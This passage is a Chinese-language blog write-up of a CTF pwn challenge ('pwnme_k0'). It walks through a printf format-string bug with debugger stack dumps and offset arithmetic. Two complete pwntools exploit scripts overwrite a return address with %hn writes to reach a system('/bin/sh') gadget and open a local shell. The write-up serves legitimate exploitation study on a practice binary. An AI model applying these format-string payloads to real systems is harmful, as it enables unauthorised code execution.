</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">fmtstr</span><span class="o">/</span><span class="err">\</span><span class="n">xe4</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe4</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">xaa</span><span class="err">\</span><span class="n">xe7</span><span class="err">\</span><span class="n">x99</span><span class="err">\</span><span class="n">xbd</span><span class="err">\</span><span class="n">xe5</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">xbd</span><span class="o">-</span><span class="n">pwnme_k0</span><span class="o">/</span><span class="n">pwnme_k0</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="nf">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span></span></span></code></pre></div><p>程序的大致就是注册账户之类的，下面代码存在漏洞：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_400B07</span><span class="p">(</span><span class="kt">char</span> <span class="n">format</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a4</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a5</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a6</span><span class="p">,</span> <span class="kt">char</span> <span class="n">formata</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a8</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x1AuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">formata</span><span class="p">,</span> <span class="s">&#34;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">printf</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a9</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>看了字符串发现有可以直接利用的system(&rsquo;/bin/sh&rsquo;),所以只要用格式化字符串漏洞直接修改某个函数的返回地址为0x4008A6就可以了。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A6</span> <span class="no">sub_4008A6</span>      <span class="no">proc</span> <span class="no">near</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A6</span> <span class="c1">; __unwind {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A6</span>                 <span class="no">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A7</span>                 <span class="no">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">AA</span>                 <span class="no">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">offset</span> <span class="no">command</span> <span class="c1">; &#34;/bin/sh&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">AF</span>                 <span class="no">call</span>    <span class="no">system</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">B4</span>                 <span class="no">pop</span>     <span class="no">rdi</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">B5</span>                 <span class="no">pop</span>     <span class="no">rsi</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">B6</span>                 <span class="no">pop</span>     <span class="no">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">B7</span>                 <span class="no">retn</span></span></span></code></pre></div><p>在000400B39处下断点，，输入后s跟进printf，跟进去的话栈上第一个肯定就是返回地址，所以返回地址后跟着的句式参数7(offset 6)。</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x7fffffffdd44 ◂— &#39;%p%p%p%p%p%p%p%p\n&#39;
 RSI  0x603260 ◂— &#39;qwertyui\nngebaimao:(\ntion!\nth:20): \n**********\n&#39;
 R8   0x0
 R9   0x7ffff7b502d0 (__memcpy_ssse3+7232) ◂— mov    rcx, qword ptr [rsi - 9]
 R10  0x7ffff7b80c40 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
 R11  0x246
 R12  0x4007b0 ◂— xor    ebp, ebp
 R13  0x7fffffffdef0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdd20 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde10 —▸ 0x400eb0 ◂— push   r15
*RSP  0x7fffffffdd18 —▸ 0x400b3e ◂— nop    
*RIP  0x7ffff7a46f70 (printf) ◂— sub    rsp, 0xd8
────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a46f70 &lt;printf&gt;        sub    rsp, 0xd8
    ↓
   0x7ffff7a46f79 &lt;printf+9&gt;      mov    qword ptr [rsp + 0x28], rsi
   0x7ffff7a46f7e &lt;printf+14&gt;     mov    qword ptr [rsp + 0x30], rdx
   0x7ffff7a46f83 &lt;printf+19&gt;     mov    qword ptr [rsp + 0x38], rcx
   0x7ffff7a46f88 &lt;printf+24&gt;     mov    qword ptr [rsp + 0x40], r8
   0x7ffff7a46f8d &lt;printf+29&gt;     mov    qword ptr [rsp + 0x48], r9
   0x7ffff7a46f92 &lt;printf+34&gt;     je     printf+91 &lt;printf+91&gt;
    ↓
   0x7ffff7a46fcb &lt;printf+91&gt;     mov    rax, qword ptr fs:[0x28]
   0x7ffff7a46fd4 &lt;printf+100&gt;    mov    qword ptr [rsp + 0x18], rax
   0x7ffff7a46fd9 &lt;printf+105&gt;    xor    eax, eax
   0x7ffff7a46fdb &lt;printf+107&gt;    lea    rax, [rsp + 0xe0]
─────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────
00:0000│ rsp    0x7fffffffdd18 —▸ 0x400b3e ◂— nop    
01:0008│ rbp    0x7fffffffdd20 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde10 —▸ 0x400eb0 ◂— push   r15
02:0010│        0x7fffffffdd28 —▸ 0x400d74 ◂— add    rsp, 0x30
03:0018│        0x7fffffffdd30 ◂— &#39;qwertyui\n&#39;
04:0020│        0x7fffffffdd38 ◂— 0xa /* &#39;\n&#39; */
05:0028│ rdi-4  0x7fffffffdd40 ◂— 0x7025702500000000
06:0030│        0x7fffffffdd48 ◂— &#39;%p%p%p%p%p%p\n&#39;
07:0038│        0x7fffffffdd50 ◂— 0xa70257025 /* &#39;%p%p\n&#39; */
───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────
 ► f 0     7ffff7a46f70 printf
   f 1           400b3e
   f 2           400d74
   f 3           400e98
   f 4     7ffff7a03bf7 __libc_start_main+231
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre><p><strong>虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。</strong></p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">─────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────
00:0000│ rsp    0x7fffffffdd18 —▸ 0x400b3e ◂— nop    （返回地址）
01:0008│ rbp    0x7fffffffdd20 —▸ 0x7fffffffdd60 offset 6(因为格式化串是参数1，前6个参数存在寄存器里，所以这里是参数7，相对格式化串就是偏移6)
02:0010│        0x7fffffffdd28 —▸ 0x400d74 ◂— add    rsp, 0x30
03:0018│        0x7fffffffdd30 ◂— &#39;aaaaaaaa\n&#39;
04:0020│        0x7fffffffdd38 ◂— 0xa /* &#39;\n&#39; */
05:0028│ rdi-4  0x7fffffffdd40 ◂— 0x7025702500000000
06:0030│        0x7fffffffdd48 ◂— &#39;%p%p%p%p%p%p\n&#39;
07:0038│        0x7fffffffdd50 ◂— 0xa70257025 /* &#39;%p%p\n&#39; */
───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────
 ► f 0     7ffff7a46f70 printf
   f 1           400b3e
   f 2           400d74
   f 3           400e98
   f 4     7ffff7a03bf7 __libc_start_main+231</code></pre><p>这里的返回地址是printf的返回地址，这时rbp还没有变化，还未进入printf，所以rbp指向的是原来rbp的地址(old rbp)。所以当前返回地址是rbp+8，即0x400d74。</p>
<p>在0x7fffffffdd28这里存着，它相对于old rbp的地址就是：0x7fffffffdd60 - 0x7fffffffdd28 = 0x38</p>
<p>用格式化串先读offst 6，也就是0x7fffffffdd20，得到rbp地址：0x7fffffffdd60，再减去0x38就得到存储返回地址的内存地址是0x7fffffffdd28</p>
<p>然后就可以去覆盖这个地址存放的返回值为我们的system(‘/bin/sh’)即0x4008A6，即需要把400D74覆盖成4008A6，即：写成0x08A6 = 2214。</p>
<p>这里需要说明的是在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system(&quot;/bin/sh&quot;) 处，即2218</p>
<p>exp1：通过把 username 改成计算出来的 ret 的地址</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./pwnme_k0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">##get retaddr</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%6$p&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">retaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x38</span>
</span></span><span class="line"><span class="cl"><span class="c1">##print &#34;retaddr = &#34; + hex(retaddr)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">retaddr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%2218d</span><span class="s2">%8$hn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><p>Exp2：在 password 后面跟上 ret 地址来修改</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%6$p&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x38</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%2218u</span><span class="s2">%12$hn&#34;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2021-02-06 18:50:57">Updated on 2021-02-06&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-title="格式化字符串漏洞举例" data-hashtags=""><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-hashtag="[PWN]"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-title="格式化字符串漏洞举例"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/" class="post-nav-item" rel="prev" title="Linux保护技术"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Linux保护技术</a><a href="/posts/ret2csu/" class="post-nav-item" rel="next" title="Ret2csu">Ret2csu<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-8212d6fd"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/"></a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"version":"v0.3.17-8212d6fd"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
</html>
